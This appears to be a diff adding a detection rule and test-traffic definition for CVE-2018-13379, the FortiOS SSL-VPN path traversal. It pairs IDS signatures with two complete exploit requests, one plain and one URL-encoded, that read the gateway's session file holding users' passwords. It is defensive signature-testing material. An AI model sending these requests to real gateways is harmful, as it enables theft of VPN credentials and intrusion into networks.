@@ -1,0 +1,48 @@
+id: TP-2018-13379
+cve: [CVE-2018-13379]
+name: FortiOS.SSL.VPN.Lang.File.Path.Traversal
+severity: critical
+target: {os: [FortiOS], app: [FortiOS SSL-VPN]}
+location: server
+summary: >-
+  FortiOS 5.4.6-5.4.12, 5.6.3-5.6.7 and 6.0.0-6.0.4 let anyone read files through the SSL-VPN web portal:
+  the lang parameter of /remote/fgt_lang walked out of the language directory. The favourite target was
+  /dev/cmdb/sslvpn_websession, which held logged-in users' names and passwords. Credentials harvested this
+  way from tens of thousands of gateways were dumped publicly in 2020 and 2021 and kept working wherever
+  passwords weren't reset after patching.
+references:
+  - https://nvd.nist.gov/vuln/detail/CVE-2018-13379
+  - https://www.exploit-db.com/exploits/47287
+signatures:
+  - id: 9100041
+    name: Directory traversal in the SSL-VPN language file request
+    proto: tcp
+    ports: [443, 4433, 8443, 10443]
+    match:
+      - {buf: uri, contains: "/remote/fgt_lang", nocase: true}
+      - {buf: uri, regex: "lang=[^&]*\\.\\./", nocase: true}
+  - id: 9100042
+    name: SSL-VPN web session file requested through the portal
+    proto: tcp
+    ports: [443, 4433, 8443, 10443]
+    match:
+      - {buf: uri, contains: "/remote/fgt_lang", nocase: true}
+      - {buf: uri, contains: "sslvpn_websession", nocase: true}
+generator:
+  port: 10443
+  tls: true
+  variants:
+    - name: websession-file
+      request: |-
+        GET /remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession HTTP/1.1
+        Host: {{target_host}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+        Connection: close
+    - name: encoded-traversal
+      request: |-
+        GET /remote/fgt_lang?lang=%2F..%2F..%2F..%2F..%2Fdev%2Fcmdb%2Fsslvpn_websession&t={{token}} HTTP/1.1
+        Host: {{target_host}}
+        User-Agent: python-requests/2.31.0
+        Connection: close
+server_effect: {process: none, when: allowed}
+lesson: Patching closes the hole but not the leak; every VPN password that passed through an exposed gateway must be reset, and MFA makes the stolen ones useless.
